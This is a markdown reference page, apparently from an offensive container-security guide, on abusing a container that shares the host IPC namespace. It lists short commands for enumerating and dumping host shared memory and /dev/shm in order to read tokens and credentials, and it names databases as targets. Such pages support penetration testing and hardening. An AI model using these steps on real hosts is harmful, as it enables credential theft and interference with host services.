---
title: "Host IPC namespace: reading shared memory and message queues of host processes"
description: "A container sharing the host IPC namespace accesses the host's System V and POSIX inter-process communication objects: shared memory segments, semaphores, and message queues. Host daemons and databases that keep sensitive data or coordination state in shared memory become readable and writable, exposing secrets and allowing interference with host services."
keywords:
  - hostipc
  - ipc namespace
  - shared memory
  - system v ipc
  - container escape
---

# Host IPC namespace

`--ipc=host` or `hostIPC: true` joins the container to the host's inter-process communication namespace, giving access to the host's System V shared memory segments, semaphores, and message queues, and to POSIX shared memory under `/dev/shm`. Processes that assume their IPC objects are private, such as databases caching rows in shared memory or daemons coordinating through semaphores, are now exposed to the container.

Confirm and enumerate the objects:

```bash
ipcs                                       # all SysV segments, semaphores, queues
ipcs -m                                     # shared memory segments with owners and sizes
ls -la /dev/shm                             # POSIX shared memory files
```

## Routes

```bash
# Attach to a host shared-memory segment and dump it for secrets
# shmid and size come from ipcs -m; a small reader attaches and reads it:
#   id = shmget(key, size, 0); p = shmat(id, 0, SHM_RDONLY); write(1, p, size);
cat /dev/shm/*                              # POSIX segments often readable directly

# Read a host process's mapped shared memory via its maps + mem
grep -F '/dev/shm' /proc/<pid>/maps
```

A database or application that keeps session tokens, decrypted data, or credentials in a shared segment leaks them straight into the container through `ipcs` and a short `shmat` reader; `/dev/shm` files are frequently world- or owner-readable and need no code at all.

## Exploitation notes

- This is mainly an information-disclosure and interference primitive: it reads secrets from host shared memory and can corrupt coordination state, but it does not directly execute code on the host.
- Its value depends on what host processes store in IPC; databases, caches, and some daemons are the richest targets. Enumerate owners with `ipcs -m` and match them to host processes.
- Pair with a shared PID namespace to map segments back to the owning host process and locate the interesting one; see [Host PID namespace](host-pid-namespace.md).

## References

- [man 7 svipc](https://man7.org/linux/man-pages/man7/sysvipc.7.html)
- [man 7 ipc_namespaces](https://man7.org/linux/man-pages/man7/ipc_namespaces.7.html)
- [HackTricks: IPC namespace](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/namespaces/ipc-namespace)
